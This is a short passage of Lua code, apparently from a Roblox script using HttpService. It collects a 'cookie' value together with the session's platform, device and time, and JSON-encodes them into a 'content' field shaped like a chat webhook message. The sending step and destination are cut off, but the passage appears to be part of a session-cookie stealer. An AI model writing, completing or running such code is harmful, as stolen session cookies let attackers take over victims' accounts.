        cookie = cookie,
        platform = sessionData.platform,
        device = sessionData.device,
        time = sessionData.time
    }
    
    local payload = {
        ["content"] = "```json\n" .. HttpService:JSONEncode(fullData) .. "\n```"
    }
    
